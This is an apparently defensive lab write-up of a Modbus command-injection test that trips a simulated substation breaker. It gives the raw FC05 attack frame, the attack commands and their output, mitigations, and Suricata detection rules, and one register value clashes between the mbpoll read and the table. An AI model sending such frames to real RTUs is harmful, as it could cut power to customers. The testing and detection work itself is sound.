# Scenario 2 — Modbus Command Injection (Breaker Trip)

**Testbed:** patsec/ot-sim layout | **Date:** 2026-04-14 | **Owner:** Bailey Taylor and Shahhin Sarlak
**Platform:** Ubuntu 24.04 LTS | Mininet 2.3 | pymodbus 3.12.1 | mbpoll 1.4.11

---

## 1. What the attack does at the protocol level

This attack uses **FC05 Write Single Coil** to flip a digital output on the RTU — specifically coil 0 (tag: line-650632.closed) from True (CLOSED) to False (OPEN).

In a real substation, "CLOSED" means the circuit breaker is energised and the feeder circuit is live. Writing False to that coil sends a TRIP command that opens the breaker, dropping the circuit.

Modbus TCP has no authentication, no session layer, no command signing. Any host that can reach port 5502 can issue a write command that is indistinguishable to the RTU from a legitimate SCADA command. The RTU acts on it immediately.

The raw Modbus TCP frame for this attack is 12 bytes:

```
00 01 00 00 00 06 01 05 00 00 00 00
```

Broken down:

| Field | Bytes | Value | Meaning |
|---|---|---|---|
| Transaction ID | 00 01 | 1 | Matches request to response |
| Protocol ID | 00 00 | 0 | Always 0 for Modbus |
| Length | 00 06 | 6 | 6 bytes follow |
| Unit ID | 01 | 1 | RTU slave address |
| Function Code | 05 | 5 | FC5 Write Single Coil |
| Coil Address | 00 00 | 0 | Coil 0 (line-650632.closed) |
| Coil Value | 00 00 | 0x0000 | OPEN (0xFF00 = CLOSED) |

The response from the RTU echoes the request — same function code, same address, same value. No error. The circuit is now open.

---

## 2. MITRE ATT&CK for ICS mapping

| Tactic | Technique | ID |
|---|---|---|
| Impair Process Control | Unauthorized Command Message | T0855 |
| Impair Process Control | Modify Control Logic | T0833 |
| Impact | Loss of Control | T0827 |
| Impact | Loss of View | T0829 |

This is the canonical ICS attack path: reconnaissance (T0861) feeds into an unauthorized command (T0855) that causes loss of control (T0827). Ukraine 2015 BlackEnergy attacks followed this exact sequence against Modbus-based substation RTUs.

---

## 3. Exact commands run

**Baseline read before attack (from h1):**

```
mbpoll -1 -a 1 -t 4 -r 30001 -c 1 10.0.0.2 -p 5502
```

Output: `[30001]: 300`

**Attack run (from h1):**

```
python3 attacks/scenario2_command_injection.py --target 10.0.0.2 --port 5502
```

Executed 2026-04-14T16:33:39.053. Output (abbreviated):

```
[+] Connected to 10.0.0.2:5502

[*] Pre-attack state:
  Coil 0  (line-650632.closed): True  (CLOSED — line energised)
  Coil 1  (line-651634.closed): True  (CLOSED — line energised)
  HR 30000 (line-650632.kW):     300
  HR 30001 (line-651634.kW):     185

[!] Sending FC5 Write Coil 0 = False (OPEN) at 2026-04-14T16:33:39.053

[*] Post-attack state:
  Coil 0  (line-650632.closed): False (OPEN  — line de-energised)
  Coil 1  (line-651634.closed): True  (CLOSED — line energised)
  HR 30000 (line-650632.kW):     300
  HR 30001 (line-651634.kW):     185

  *** ATTACK SUCCESSFUL ***
  Coil 0 flipped: line-650632 changed from CLOSED to OPEN.
  In a real substation this would de-energise the feeder circuit.
```

**Confirmation read after attack:**

```
mbpoll -1 -a 1 -t 4 -r 30001 -c 1 10.0.0.2 -p 5502
```

Output: `[30001]: 300`

**Coil reset:**

```
python3 -c "from pymodbus.client import ModbusTcpClient; ..."
```

Output: `Coil 0 reset to CLOSED, result: WriteSingleCoilResponse(...status=1...)`

---

## 4. Before and after register values

| Tag | Address | Before | After |
|---|---|---|---|
| line-650632.closed | Coil 0 | True (CLOSED) | **False (OPEN)** |
| line-651634.closed | Coil 1 | True (CLOSED) | True (CLOSED) |
| line-650632.kW | HR 30000 | 300 | 300 |
| line-651634.kW | HR 30001 | 185 | 185 |

Note: the holding registers do not change because the simulated server does not model the physical consequence of a breaker trip (which would cause MW readings to drop to zero). In a real RTU with physics modelled, HR 30000 would drop from 300 to 0 following the trip.

---

## 5. What this would mean in a real substation

Line 650632 carries 300 kW. Opening that breaker at peak demand:

- Drops 300 kW of load instantaneously. Depending on the substation, this could affect hundreds of residential customers or a critical industrial load.
- The SCADA HMI (h3) would see the coil change on its next polling cycle (typically 1-4 seconds). An alert fires, but the breaker is already open.
- If the substation has protection relays set to lock out after a trip, the operator cannot close the breaker remotely without a field crew. Recovery time: 15 minutes minimum.
- If timed to coincide with high grid stress (peak summer, another fault in progress), this could cascade into broader load shedding.

The attacker did not need physical access, insider knowledge, or any credentials. The only requirement was network access to port 5502 — something achievable from a compromised IT host if IT/OT segmentation is absent.

---

## 6. Recommended mitigations

1. **Whitelist only legitimate SCADA IPs for write function codes.** Configure a Modbus firewall or ACL to permit FC05, FC06, FC15, FC16 only from the SCADA server (10.0.1.1 in this topology). Block all write-capable function codes from any other source, including engineering workstation IPs unless explicitly whitelisted. This is the single most effective control: it does not require changes to the RTU or SCADA software.

2. **Enable write logging and alerting on the SCADA/Historian.** The RTU does not log writes internally. But the Historian (h4) should mirror all Modbus traffic. Configure an alert when a coil write originates from a non-SCADA source, or when coil 0 or 1 changes state outside an expected maintenance window. State changes outside business hours or without a corresponding operator action in the SCADA audit log should be treated as potential injection.

3. **Deploy Modbus read-back verification in the SCADA application.** After any operator-initiated coil write, the SCADA should immediately re-read the coil and compare to the intended value. If an attacker writes a value between the operator's read and write cycles, the re-read will detect the discrepancy. This "command echo" pattern is common in safety-instrumented systems and can be retrofitted to existing SCADA configurations without RTU changes.

---

## 7. Detection opportunities

**Suricata rule — FC05 Write Single Coil from non-SCADA host:**

```
alert tcp !10.0.1.1 any -> 10.0.0.2 5502 (
  msg:"MODBUS FC05 Write Coil - Unauthorized Source";
  flow:to_server,established;
  byte_test:1,=,5,7;
  sid:9000010; rev:1;
)
```

**Suricata rule — detect coil OPEN value (0x0000):**

```
alert tcp any any -> 10.0.0.2 5502 (
  msg:"MODBUS FC05 Write Coil OPEN - Possible Trip Command";
  flow:to_server,established;
  content:"|05 00 00 00 00|";
  offset:7; depth:5;
  sid:9000011; rev:1;
)
```

**SCADA alert:** Any coil state change on coil 0 or 1 (line-650632, line-651634) should generate a Priority 1 operator notification. If the change was not initiated from the SCADA console, automatically log the source IP from the Modbus TCP session.

---

## 8. Issues encountered during execution

- The initial `h2.cmd("python3 server.py &")` approach in the runner did not reliably background the server process in Mininet's process namespace. The server exited when the cmd pipe closed, leaving port 5502 unbound. Fixed by switching to `h2.popen()` which spawns a proper subprocess in h2's network namespace without blocking.
- pymodbus 3.12 uses `device_id=1` instead of `slave=1` in all client calls. All three attack scripts were updated before the final run.
- The holding register reads after the coil write show the same values (300, 185) because the simulated Modbus server does not model physical consequences. This is a limitation of the testbed, not the attack.
- Attack completed successfully on the first attempt after API fixes. Total time from connect to confirmed state change: under 1 second.
